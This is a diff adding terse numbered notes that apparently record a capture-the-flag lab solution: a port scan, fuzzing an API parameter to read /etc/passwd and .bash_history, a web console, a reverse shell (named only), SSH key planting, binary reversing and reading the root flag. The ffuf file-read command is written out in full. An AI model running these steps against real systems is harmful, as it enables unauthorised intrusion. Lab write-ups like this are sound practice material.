@@ -1,0 +1,15 @@
+1 - nmap -A 10.10.139.50
+2 - http://10.10.139.50/login.html
+3 - http://10.10.139.50:5000/robots.txt
+4 - http://10.10.139.50:5000/api
+5 - ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.139.50:5000/api/v2/resources/books\?FUZZ\=/etc/passwd --mc 200
+6 - http://10.10.139.50:5000/api/v1/resources/books?show=.bash_history
+7 - http://10.10.139.50/console
+8 - python reverse shell
+9 - cat user.txt
+10 - /home/sid/.ssh/authorized_keys
+11 - ssh sid@10.10.139.50
+12 - scp sid@10.10.139.50:/home/sid/try-harder .
+13 - Ghidra
+14 - ssh sid@10.10.139.50
+15 - cat /root/root.txt
